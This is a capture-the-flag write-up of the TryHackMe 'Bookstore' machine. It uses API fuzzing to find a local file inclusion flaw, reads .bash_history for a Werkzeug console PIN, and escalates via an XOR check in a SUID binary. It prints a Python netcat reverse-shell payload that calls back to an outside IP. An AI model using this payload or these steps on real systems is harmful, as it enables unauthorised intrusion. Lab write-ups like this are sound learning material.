---
title: Bookstore TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: Bookstore TryHackMe Writeup
---

![logo](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/logo.jpeg)

## Scanning
We launch nmap with scripts and software versions on all ports.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/1.png)

## Enumeration
We list two web services on port 80 of this website:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/2.png)

In the source code of the file *"login.html"* we list relevant information about a PIN that is stored in a file *.bash_history*

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/8.png)

And at port 5000:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/3.png)

In the nmap capture, it listed the directory *"/api/"*, there we will be able to list several of the site's functionalities.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/4.png)

We test the API and see that it works correctly from Burp.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/5.png)

We use the **Nikto** tool and enumerate the directory *"/console/"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/6.png)

We access to the directory and we see that it asks for a PIN to be able to unlock this functionality.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/7.png)


## Exploitation
Searching on Google about the type of server and its PIN, I found this [documentation](https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug)

To get the PIN, we would need to know a couple of parameters, but to get them we must be able to read some system files. 

Here the API will come into play, so we will do a brute force attack to enumerate some parameter that will help us to do LFI (Local File Inclusion).

We launched the **Wfuzz** tool with an average dictionary, in version 2 of the API we did not list anything new, but in version 1 we did.

#### API V2

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/9.png)

#### API V1

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/10.png)

If we access from the browser, we see that we can embed files (LFI).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/11.png)

#### Flag user.txt

We exploit the vulnerability to be able to read the flag *user.txt*

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/12.png)


Recall that they mentioned that the PIN was being stored in the *.bash_history* file. Thanks to the */etc/passwd* file, we know the user names that contain home folder and we can enumerate the file and the access PIN.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/13.png)

We use the PIN and now we have access to the interactive console.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/14.png)

We use the following payload and we will have a reverse shell to the victim machine.

### Code Execute

``` python

__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f').read();

```

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/15.png)

### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/16.png)


## Privilege Escalation

We checked the directory of the user *"sid"*, we found a binary that could be the way to escalate privileges, since it runs as the **root** user.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/17.png)


We transfer the binary to our kali, check with the **Ghidra** tool and see the conditional where it calls the 3 parameters calculating the xor value. 


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/20.png)


But even if we are missing a parameter, we can obtain it by reversing the xor with the values we have.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/21.png)

With the magic number in our hands, we insert it and we become root and read the flag of *root.txt*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Bookstore/22.png)
